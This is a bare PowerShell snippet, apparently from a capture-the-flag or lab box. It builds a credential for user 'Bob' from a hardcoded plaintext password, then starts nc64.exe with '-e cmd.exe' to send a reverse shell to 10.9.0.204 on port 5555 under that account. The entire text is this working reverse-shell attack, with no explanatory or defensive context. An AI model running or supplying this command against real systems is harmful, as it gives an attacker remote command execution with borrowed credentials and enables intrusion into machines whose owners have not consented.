$secpasswd = ConvertTo-SecureString "!P@$$W0rD!123" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("Bob", $secpasswd)
$computer = "RELEVANT"
[System.Diagnostics.Process]::Start("c:\Users\Bob\Desktop\nc64.exe","10.9.0.204 5555 -e c:\windows\system32\cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
 
